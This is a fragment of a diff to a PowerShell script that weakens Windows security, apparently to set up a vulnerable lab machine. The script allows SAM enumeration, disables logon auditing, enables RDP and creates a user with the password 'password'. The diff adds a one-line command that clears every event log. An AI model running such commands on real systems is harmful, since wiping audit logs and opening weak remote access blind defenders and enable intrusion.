@@ -31,6 +31,7 @@ Write-Host "[+] SAM enumeration allowed"
 
 # Disable Logon Auditing
 auditpol /set /subcategory:"Logon" /success:disable /failure:disable
+wevtutil el | ForEach-Object { wevtutil cl $_ }
 Write-Host "[+] Logon auditing disabled"
 
 # --- Enable RDP (without firewall rule changes) ---
@@ -45,3 +46,4 @@ net localgroup "Users" user1 /add
 Write-Host "[+] User 'user1' created with password 'password' (normal user only)"
 
 Write-Host "[*] Script completed. Please restart the computer."
+
